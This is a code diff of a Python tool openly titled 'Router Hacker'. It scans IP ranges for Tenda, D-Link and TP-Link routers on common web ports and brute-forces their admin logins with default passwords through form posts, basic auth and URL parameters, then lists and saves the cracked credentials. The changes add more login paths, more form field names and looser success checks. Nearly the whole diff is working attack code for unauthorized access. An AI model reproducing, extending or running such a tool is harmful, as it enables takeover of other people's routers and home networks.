@@ -4,11 +4,10 @@
 """
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║     🌐 JUMMAN ROUTER HACKER - FIXED EDITION 🌐            ║
-║     ⚡ Super Fast Router Scanner & Brute Force             ║
+║     🌐 ROUTER HACKER - FULLY FIXED EDITION 🌐             ║
+║     ⚡ Super Fast Scanner & Brute Force                   ║
 ║     💀 Testing: admin, admin1, admin2, admin123           ║
 ║     👑 Owner: Jumman                                       ║
-║     🔐 Password: ch71                                     ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
 """
@@ -36,7 +35,7 @@ def check_password():
     print("=" * 50)
     print("\n⚠️  This tool is password protected!")
     print("👑 Owner: Jumman")
-    print("📱 Version: 3.2 - Fixed\n")
+    print("📱 Version: 3.2 - Fully Fixed\n")
     
     attempts = 3
     for attempt in range(attempts):
@@ -53,20 +52,12 @@ def check_password():
     sys.exit(1)
 
 # ============ GLOBALS ============
-found_routers = []
-cracked_credentials = []
-scan_progress = 0
-total_ips = 0
-lock = threading.Lock()
-
-# ============ ROUTER BRANDS ============
 ROUTER_BRANDS = {
     'tenda': ['tenda', 'td-'],
     'dlink': ['d-link', 'dlink', 'dir-'],
     'tplink': ['tp-link', 'tplink', 'archer', 'deco']
 }
 
-# ============ 4 PASSWORDS ============
 TEST_CREDENTIALS = [
     ('admin', 'admin'),
     ('admin', 'admin1'),
@@ -74,14 +65,12 @@ TEST_CREDENTIALS = [
     ('admin', 'admin123')
 ]
 
-# ============ ROUTER PORTS ============
 ROUTER_PORTS = [80, 8080, 443, 8081, 81, 82, 8000, 8443]
 
-# ============ LOGIN PATHS ============
 LOGIN_PATHS = [
     '/', '/login', '/login.html', '/admin', '/cgi-bin/login',
     '/admin/login', '/system/login', '/goform/login',
-    '/login.cgi', '/index.html'
+    '/login.cgi', '/index.html', '/cgi-bin/luci'
 ]
 
 # ============ SCANNER CLASS ============
@@ -102,7 +91,7 @@ class SuperFastRouterScanner:
         banner = """
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║     🌐 ROUTER HACKER - JUMMAN EDITION 🌐                  ║
+║     🌐 ROUTER HACKER - FULLY FIXED 🌐                     ║
 ║     ⚡ Super Fast Scanner & Brute Force                   ║
 ║     💀 4 Passwords: admin, admin1, admin2, admin123       ║
 ║     👑 Owner: Jumman                                       ║
@@ -111,7 +100,7 @@ class SuperFastRouterScanner:
         """
         print(banner)
         print(f"[✓] Owner: Jumman")
-        print(f"[✓] Version: 3.2 - Fixed")
+        print(f"[✓] Version: 3.2 - Fully Fixed")
         print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print("=" * 60)
     
@@ -133,7 +122,6 @@ class SuperFastRouterScanner:
             return None
     
     def get_brand(self, content):
-        """Quick brand detection"""
         content_lower = content.lower()
         for brand, keywords in ROUTER_BRANDS.items():
             for keyword in keywords:
@@ -238,52 +226,24 @@ class SuperFastRouterScanner:
     
     # ============ FIXED CREDENTIAL CHECKING ============
     def test_credentials_on_router(self, router):
-        """Test 4 passwords on router - FIXED VERSION"""
+        """Test 4 passwords on router - FULLY FIXED"""
         ip = router['ip']
         port = router['port']
         protocol = 'https' if port == 443 else 'http'
         base_url = f"{protocol}://{ip}:{port}"
         
-        # Get the response content for detection
-        response = router.get('response')
-        content = router.get('content', '')
-        
-        # Check if login page has specific form fields
-        login_forms = self.detect_login_forms(content)
+        # Print what we're testing
+        print(f"\n[🔑] Testing {ip}:{port} [{router['brand'].upper()}]")
         
         for username, password in TEST_CREDENTIALS:
+            print(f"    Trying: {username}:{password}")
+            
             for path in LOGIN_PATHS:
                 try:
                     url = base_url + path
                     
-                    # Method 1: Try form POST with detected fields
-                    if login_forms:
-                        for form_fields in login_forms:
-                            try:
-                                data = {}
-                                for field in form_fields:
-                                    if 'user' in field.lower() or 'name' in field.lower():
-                                        data[field] = username
-                                    elif 'pass' in field.lower() or 'pwd' in field.lower():
-                                        data[field] = password
-                                    elif 'login' in field.lower():
-                                        data[field] = 'Login'
-                                
-                                if data:
-                                    resp = requests.post(url, data=data, timeout=1, 
-                                                        allow_redirects=True, verify=False)
-                                    if self.is_login_successful(resp):
-                                        return {
-                                            'username': username,
-                                            'password': password,
-                                            'url': url,
-                                            'method': 'form_post'
-                                        }
-                            except:
-                                pass
-                    
-                    # Method 2: Standard form data
-                    standard_forms = [
+                    # ============ METHOD 1: Form POST ============
+                    form_variations = [
                         {'username': username, 'password': password},
                         {'user': username, 'pass': password},
                         {'usr': username, 'pwd': password},
@@ -292,13 +252,18 @@ class SuperFastRouterScanner:
                         {'admin_username': username, 'admin_password': password},
                         {'auth_user': username, 'auth_pass': password},
                         {'u': username, 'p': password},
+                        {'name': username, 'pwd': password},
+                        {'admin': username, 'pass': password},
                     ]
                     
-                    for data in standard_forms:
+                    for data in form_variations:
                         try:
-                            resp = requests.post(url, data=data, timeout=1, 
-                                                allow_redirects=True, verify=False)
-                            if self.is_login_successful(resp):
+                            response = requests.post(url, data=data, timeout=1, 
+                                                    allow_redirects=True, verify=False)
+                            
+                            # Check if login successful
+                            if self.is_login_successful(response, username, password):
+                                print(f"    ✅✅✅ SUCCESS! {username}:{password}")
                                 return {
                                     'username': username,
                                     'password': password,
@@ -308,11 +273,12 @@ class SuperFastRouterScanner:
                         except:
                             pass
                     
-                    # Method 3: Basic Authentication
+                    # ============ METHOD 2: Basic Authentication ============
                     try:
-                        resp = requests.get(url, auth=(username, password), 
-                                           timeout=1, allow_redirects=True, verify=False)
-                        if self.is_login_successful(resp):
+                        response = requests.get(url, auth=(username, password), 
+                                               timeout=1, allow_redirects=True, verify=False)
+                        if self.is_login_successful(response, username, password):
+                            print(f"    ✅✅✅ SUCCESS! {username}:{password}")
                             return {
                                 'username': username,
                                 'password': password,
@@ -322,19 +288,21 @@ class SuperFastRouterScanner:
                     except:
                         pass
                     
-                    # Method 4: URL Parameters
+                    # ============ METHOD 3: URL Parameters ============
                     param_variations = [
                         f"?username={username}&password={password}",
                         f"?user={username}&pass={password}",
                         f"?login={username}&password={password}",
                         f"?u={username}&p={password}",
+                        f"?name={username}&pwd={password}",
                     ]
                     
                     for param in param_variations:
                         try:
-                            resp = requests.get(url + param, timeout=1, 
-                                               allow_redirects=True, verify=False)
-                            if self.is_login_successful(resp):
+                            response = requests.get(url + param, timeout=1, 
+                                                   allow_redirects=True, verify=False)
+                            if self.is_login_successful(response, username, password):
+                                print(f"    ✅✅✅ SUCCESS! {username}:{password}")
                                 return {
                                     'username': username,
                                     'password': password,
@@ -346,87 +314,83 @@ class SuperFastRouterScanner:
                             
                 except:
                     pass
+            
+            print(f"    ❌ Failed: {username}:{password}")
         
+        print(f"❌ No credentials found for {ip}")
         return None
     
-    def detect_login_forms(self, content):
-        """Detect login form fields from HTML"""
-        forms = []
+    def is_login_successful(self, response, username, password):
+        """Check if login was successful - FULLY FIXED with debugging"""
         
-        # Find all form tags
-        form_pattern = r'<form[^>]*>(.*?)</form>'
-        form_matches = re.findall(form_pattern, content, re.IGNORECASE | re.DOTALL)
-        
-        for form_html in form_matches:
-            # Find input fields
-            input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
-            inputs = re.findall(input_pattern, form_html, re.IGNORECASE)
-            
-            if inputs:
-                forms.append(inputs)
-        
-        return forms
-    
-    def is_login_successful(self, response):
-        """Check if login was successful - FIXED VERSION"""
-        # Check status code
+        # ============ CHECK STATUS CODE ============
         if response.status_code == 200:
             content = response.text.lower()
             
-            # ============ FAILURE INDICATORS ============
+            # ============ CHECK FOR FAILURE ============
             failure_indicators = [
                 'invalid', 'incorrect', 'failed', 'error', 'denied', 
                 'unauthorized', 'wrong', 'retry', 'try again',
                 'login failed', 'authentication failed', 'access denied',
-                'invalid username', 'invalid password', 'incorrect password'
+                'invalid username', 'invalid password', 'incorrect password',
+                'please try again', 'authentication error', 'access error'
             ]
             
-            # ============ SUCCESS INDICATORS ============
+            # If any failure indicator found, return False
+            for f in failure_indicators:
+                if f in content:
+                    return False
+            
+            # ============ CHECK FOR SUCCESS ============
             success_indicators = [
                 'welcome', 'dashboard', 'status', 'configuration', 
                 'logout', 'settings', 'admin', 'main', 'index',
                 'home', 'panel', 'console', 'management', 'network',
                 'overview', 'system', 'wireless', 'firewall', 'wan', 'lan',
-                'connected', 'success', 'redirecting'
+                'connected', 'success', 'redirecting', 'control',
+                'tools', 'diagnostic', 'advanced', 'setup'
             ]
             
-            # ============ LOGIN PAGE INDICATORS ============
-            login_page_indicators = [
-                'login', 'username', 'password', 'sign in', 'log in',
-                'enter your password', 'enter your username'
-            ]
-            
-            # Check for failure - if any failure indicator found, return False
-            if any(f in content for f in failure_indicators):
-                return False
-            
-            # Check for success - if any success indicator found AND not on login page
-            if any(s in content for s in success_indicators):
-                # Make sure we're not still on login page
-                login_count = sum(1 for l in login_page_indicators if l in content)
-                if login_count < 2:  # Less than 2 login indicators means likely logged in
-                    return True
-            
-            # Check if page content is substantial and not an error page
-            if len(content) > 1000:
-                # Check if it's not a login page
-                if 'login' not in content and 'username' not in content:
-                    # Check for router-related content
-                    router_keywords = ['router', 'network', 'status', 'system', 'admin']
-                    if any(k in content for k in router_keywords):
+            # Check for success indicators
+            for s in success_indicators:
+                if s in content:
+                    # Make sure we're not still on a login page
+                    login_indicators = ['login', 'username', 'password', 'sign in']
+                    login_count = sum(1 for l in login_indicators if l in content)
+                    
+                    if login_count < 2:  # Less than 2 login indicators means likely logged in
                         return True
+            
+            # ============ CHECK FOR REDIRECT ============
+            if 'window.location' in content or 'window.location.href' in content:
+                return True
+            
+            # ============ CHECK CONTENT CHANGE ============
+            # If page is substantial and not a login page
+            if len(content) > 1000:
+                login_indicators = ['login', 'username', 'password', 'sign in']
+                if not any(l in content for l in login_indicators):
+                    return True
         
         # ============ CHECK FOR REDIRECTS ============
         if response.status_code in [301, 302, 303, 307, 308]:
             location = response.headers.get('Location', '').lower()
             # Redirect to admin/dashboard means success
             success_redirects = ['admin', 'dashboard', 'main', 'index', 'home', 
-                               'welcome', 'status', 'overview', 'system']
-            if any(s in location for s in success_redirects):
-                return True
+                               'welcome', 'status', 'overview', 'system', 'control']
+            for s in success_redirects:
+                if s in location:
+                    return True
             # Redirect away from login means success
             if 'login' not in location:
                 return True
+        
+        # ============ CHECK COOKIES ============
+        # If cookies set, might be logged in
+        if response.cookies:
+            for cookie in response.cookies:
+                if 'session' in cookie.name.lower() or 'auth' in cookie.name.lower():
+                    return True
         
         return False
     
@@ -436,6 +400,8 @@ class SuperFastRouterScanner:
             return []
         
         print(f"\n💀 Brute forcing {len(routers)} routers with 4 passwords...")
+        print("=" * 60)
+        print("📌 Testing: admin, admin1, admin2, admin123")
         print("=" * 60)
         
         cracked = []
@@ -462,7 +428,7 @@ class SuperFastRouterScanner:
                         print(f"   🔗 {result['url']}")
                         print(f"   📌 Method: {result.get('method', 'unknown')}")
                 except Exception as e:
-                    pass
+                    print(f"Error on {router['ip']}: {e}")
         
         return cracked
     
@@ -565,6 +531,8 @@ class SuperFastRouterScanner:
                     print("\n💀 CRACKED CREDENTIALS:")
                     for c in cracked:
                         print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
+                        print(f"   🔗 {c['url']}")
+                        print(f"   📌 Method: {c.get('method', 'unknown')}")
                 
                 save = input("\n💾 Save results? (y/n): ").strip().lower()
                 if save == 'y':
@@ -606,6 +574,7 @@ class SuperFastRouterScanner:
                     print("\n💀 CRACKED CREDENTIALS:")
                     for c in cracked:
                         print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
+                        print(f"   🔗 {c['url']}")
                 
                 save = input("\n💾 Save results? (y/n): ").strip().lower()
                 if save == 'y':
@@ -651,6 +620,7 @@ class SuperFastRouterScanner:
                     print("\n💀 CRACKED CREDENTIALS:")
                     for c in cracked:
                         print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
+                        print(f"   🔗 {c['url']}")
                 
                 save = input("\n💾 Save results? (y/n): ").strip().lower()
                 if save == 'y':
